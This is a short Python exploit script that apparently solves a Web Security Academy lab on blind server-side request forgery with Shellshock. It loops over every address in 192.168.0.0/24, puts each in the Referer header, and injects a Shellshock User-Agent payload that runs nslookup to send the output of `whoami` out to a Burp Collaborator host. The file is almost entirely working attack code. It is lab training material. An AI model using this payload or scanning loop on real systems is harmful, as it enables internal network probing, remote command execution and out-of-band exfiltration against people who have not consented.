import base64
import http.client
import ipaddress
import ssl
import urllib.parse

LAB_ID = "???"
COLLABORATOR_URL = "???.oastify.com"


def GET_product(
        referrer: str,
        additional_header: tuple[str, str],
) -> http.client.HTTPResponse:
    method, path = 'GET', '/product?productId=2'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'referer': referrer,
        additional_header[0]: additional_header[1],
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


for ip in ipaddress.ip_network('192.168.0.0/24').hosts():
    print(f"trying Shellshock payload on internal ip: {ip}")
    url = (f"{base64.urlsafe_b64encode(str(ip).encode()).decode().replace('=', '')}"
           ".`whoami`"
           f".{COLLABORATOR_URL}")
    response = GET_product(
        referrer=f"http://{ip}:8080",
        additional_header=(
            "user-agent",
            f"() {{ :; }}; /usr/bin/nslookup {url}",
        ),
    )
    print(f"status: {response.status}, length: {len(response.read())}")
